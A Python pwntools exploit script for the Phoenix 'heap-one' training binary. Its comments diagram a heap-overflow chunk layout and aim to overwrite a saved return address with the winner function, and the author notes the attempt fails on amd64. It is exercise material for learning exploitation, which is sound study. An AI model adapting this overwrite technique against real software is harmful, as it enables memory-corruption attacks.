#!/usr/bin/env python3
from pwn import *

path = "/opt/phoenix/amd64/heap-one"
context.binary = path
# context.log_level = "debug"

# bruh why is it linked against musl, gef's heap cmd doesn't work

# Before first strcpy
# | prev size | cur size  | priority  | name      | -- i1
# | prev size | cur size  | name str              | -- i1-> name
# | prev size | cur size  | priority  | name      | -- i2
# | prev size | cur size  | name str              | -- i2-> name
#
# Note that although name is given malloc(8), malloc is free to
# allocate more, e.g., to satisfy alignment; in this case name has
# 16 bytes.
# The chunk size field is 0x21 = 16 (user data) + 16 (overhead) + 1 (prev in use bit)
#
# After first strcpy
# | prev size |  cur size |  priority | name      | -- i1
# | prev size |  cur size |  <1st>      <2nd>     | -- i1-> name
# |   <3rd>   |    <4th>  |  <5th>    | <address> | -- i2
# | prev size |  cur size |  name str             | -- i2-> name
#
# We can use the second strcpy to copy address of winner to stack.
# We can't overwrite GOT because GOT address has null bytes in them,
# and we can't zero out the upper bytes of the existing name address.

# However, we can't load the address of winner on amd64. argv doesn't take
# null bytes, so the upper bytes of the address will be filled with garbage.
# I haven't found a way to bypass this.

# overwrite data buffer + prev chunk size + cur chunk size
# puts_gotplt = 0x6041D0
saved_rip = 0x00007FFFFFFFDF28
argv1 = cyclic(40) + pack(saved_rip).rstrip(b"\x00")
argv2 = pack(0x400AF3).rstrip(b"\x00")

io = process([path, argv1, argv2])
print(io.recvline())  # Welcome
print(io.recvline())  # result
print(io.recvline())  # result
